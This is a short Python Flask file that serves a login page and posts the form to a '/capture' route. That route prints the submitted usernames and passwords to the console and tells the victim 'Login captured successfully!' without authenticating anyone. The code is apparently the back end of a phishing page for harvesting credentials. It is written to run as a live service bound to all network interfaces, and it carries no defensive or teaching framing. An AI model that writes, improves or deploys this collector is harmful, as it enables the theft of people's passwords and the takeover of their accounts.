from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username")
    password = request.form.get("password")
    print(f"🔥 Username: {username}")
    print(f"🔥 Password: {password}")
    return "✅ Login captured successfully!"

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

